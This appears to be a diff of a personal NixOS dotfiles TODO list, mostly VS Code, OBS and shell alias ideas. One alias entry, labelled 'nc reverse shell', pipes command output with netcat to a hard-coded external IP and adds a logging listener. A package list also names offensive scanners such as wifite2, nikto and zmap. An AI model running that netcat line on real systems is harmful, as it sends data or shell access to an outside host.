@@ -83,8 +83,69 @@ Set user password and TODO other steps from [NixOS installation manual](https://
 - [flake-parts](https://nix-community.github.io/home-manager/index.xhtml#sec-flakes-flake-parts-module)
 - parse nix files for pkgs (or do it via nix script)
 - better way to work with functions in shell.nix
+- GUI
+  - new software
+    - <https://github.com/omegaui/cliptopia>
+  - move badapple gif and mp3 outsude of git (or genereate them idk)
+  - vscode
+    - export configs
+      - layout
+      - extensions
+      - profiles
+    - color logs
+    - python -File activate envs
+    - pycharm like run file
+    - "python.analysis.autoImportCompletions": true
+    - git tree view by default
+    - ctrl+shift++ in terminal
+    -
+    - [test open](vscode://file/D:\sync\notes)
+    - restart extension hosts workaround for copilot
+    - debug inside python container
+    - disable parenthesis when apply auto-import
+    - PR settings.openFilesInProfile
+    - remove/sort plugins
+      - use profiles
+        - make own profiles system with minimal overhead
+          - nixos?
+    - windows tab in terminal WTF
+    -
+      - compound logs check
+      - cssho.vscode-svgviewer is needed?
+      - jock.svg is needed?
+    - shift+enter WTF
+    - <https://code.visualstudio.com/docs/copilot/copilot-customization#_reusable-prompt-files-experimental>
+    - <https://code.visualstudio.com/docs/copilot/copilot-customization>
+    - <https://code.visualstudio.com/updates/v1_98#_task-rerun-action>
+  - obs
+    - quick replay (import scenes)
+    - battery-based auto-replay
+  - find browser sync bookmarks and history tool
+  - mpv screenshots folder
 
 ### Shell
+
+#### New software
+
+- zsh or fish (or bash lol)
+- nmap to rustscan
+- [dive](https://github.com/wagoodman/dive)
+- [Mosh: the mobile shell](https://mosh.org/)
+- <https://github.com/pojntfx/octarchive>
+- [yassinebridi/serpl: A simple terminal UI for search and replace, ala VS Code.](https://github.com/yassinebridi/serpl)
+- test.nix
+  - busybox
+  - lshw-gui
+  - new add security scanners
+    - nikto
+    - ffuf
+    - seclists
+    - frida-tools
+    - wifite2
+    - zmap
+    - rustscan
+  - editor
+    - helix
 
 #### Alias
 
@@ -96,26 +157,54 @@ Set user password and TODO other steps from [NixOS installation manual](https://
 - wgu fzf selector
   - best location for config files
     - agenix secrets?
+- grep config folder for cheatsheet
+- code=co
+- clear=cl
+- dcu not pull
+- dcup prod
+- set-alias -name pn -value pnpm
+- wsl `find / -not -path '/mnt/*'`
+- `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
+- git config core.editor=code -w -n
+- nc reverse shell
+  - exec command 2>&1 | nc 176.117.72.208 12345
+  - nc -l -p 12345 2>&1 | tee -a keklol
+- fzc alias=fzf ~/config
+- nv show .files
+- nvf current dir or sudo or ignore /proc etc
+- llt ls tree
+  - or lll
+- uv run --python 3.13t -- python
+- py
+- docker compose fzf command
+- alias ip='ip --color=auto'
+- proto outdated --update
 
 #### Other
 
 - [guix environment like](https://github.com/NixOS/nix/issues/8207)
   - [containter](https://wiki.nixos.org/wiki/NixOS_Containers)
   - [firejail](https://github.com/netblue30/firejail)
-- [bat extras](https://github.com/eth-p/bat-extras)
-  - programs.bat.extraPackages
-    - batdiff?
-    - batman ?
+- bat
+  - [zsh '--help' alias](https://github.com/sharkdp/bat#highlighting---help-messages)
+    - [explain command](https://github.com/learnbyexample/command_help)
+  - [bat extras](https://github.com/eth-p/bat-extras)
+    - programs.bat.extraPackages
+      - batdiff?
+      - batman ?
 - nvim
   - nvimpager
     - enable syntax hightlighting
     - disable all other
     - batman ?
   - init.lua vim types
-- [explain command](https://github.com/learnbyexample/command_help)
 - python
   - direnv
   - uv2nix
+- starship
+  - remove versions
+- .editorconfig conf
+  - make it global ?
 
 ### 25.05
 
